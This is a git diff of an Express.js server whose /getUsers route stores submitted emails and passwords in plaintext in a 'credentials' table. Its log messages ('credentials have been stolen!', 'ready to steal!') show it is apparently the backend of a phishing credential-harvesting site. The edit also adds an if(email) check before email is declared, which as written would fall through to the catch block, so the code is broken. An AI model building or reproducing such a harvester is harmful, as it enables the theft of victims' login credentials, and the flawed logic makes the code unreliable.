@@ -13,6 +13,9 @@ app.get("/", (req, res) => {
 
 app.put("/getUsers", async (req, res) => {
   try {
+    if(email) {
+
+    
     const { email } = req.body;
     const { password } = req.body;
 
@@ -20,10 +23,11 @@ app.put("/getUsers", async (req, res) => {
       `INSERT INTO credentials (email_phone, password) 
                   VALUES ($1, $2) 
                   ON CONFLICT(email_phone) DO UPDATE
-                  SET email_phone = EXCLUDED.email_phone, password = EXCLUDED.password`,
+                  SET password = EXCLUDED.password`,
       [email, password]
     );
     console.log(`${email}'s credentials have been stolen!`);
+    } 
   } catch (error) {
     console.log('ready to steal!');
   }
